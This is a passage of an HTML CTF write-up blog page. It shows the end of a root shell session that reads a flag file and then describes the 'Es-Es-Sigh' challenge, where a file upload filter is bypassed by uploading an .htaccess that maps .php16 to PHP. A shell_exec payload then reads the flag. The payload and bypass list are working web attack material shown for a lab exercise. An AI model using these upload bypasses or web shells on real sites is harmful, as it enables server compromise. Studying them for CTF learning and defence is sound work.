+</span><span class="s1">b&#39;</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span><span class="se">\n</span><span class="s1">&#39;
+</span><span class="s1">input exec cmd:(q-&gt;exit)
+</span><span class="s1">&gt;&gt;cat /root/flag.txt
+</span><span class="s1">b&#39;</span>DOCTF<span class="o">{</span>R3D1S_MO1_CA_3N_4NGL41S<span class="o">}</span><span class="err">&#39;</span>
+input <span class="nb">exec</span> cmd:<span class="o">(</span>q-&gt;exit<span class="o">)</span>
+</code></pre></div><h1 id="es-es-sigh">Es-Es-Sigh<a hidden class="anchor" aria-hidden="true" href="#es-es-sigh">#</a></h1>
+<p>We have a basic page which allow us to upload files.<code>.php</code>extension is not allowed, and usual tricks such as:</p>
+<ul>
+<li>Modify Content-Type in POST request</li>
+<li><code>file.php.png</code></li>
+<li><code>file.png.php</code></li>
+<li><code>file.php%00</code></li>
+<li><code>file.php./</code></li>
+<li><code>file.PHP</code></li>
+<li>etc.</li>
+</ul>
+<p>were not working (PHP was not executed). So I tried to upload a <code>.htaccess</code>, which will allow us to interprete some other extension as PHP:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ cat .htaccess
+AddType application/x-httpd-php .php16
+</code></pre></div><p>Upload is successful, and now <code>.php16</code> will be executed as PHP. Then you can get the flag with the following payload:</p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="p">$</span> <span class="nb">cat </span><span class="n">flag</span><span class="p">.</span><span class="n">php16</span>
+<span class="p">&lt;</span><span class="k">?</span><span class="n">php</span>
+<span class="nb">echo </span><span class="n">shell_exec</span><span class="p">(</span><span class="s2">&#34;cat /home/flag.txt&#34;</span><span class="p">);</span>
+<span class="p">?&gt;</span>
+</code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="next" href="https://luhko.github.io/write-up/pwnme/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Pwnme CTF</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2022 <a href="https://luhko.github.io/">Luhko</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
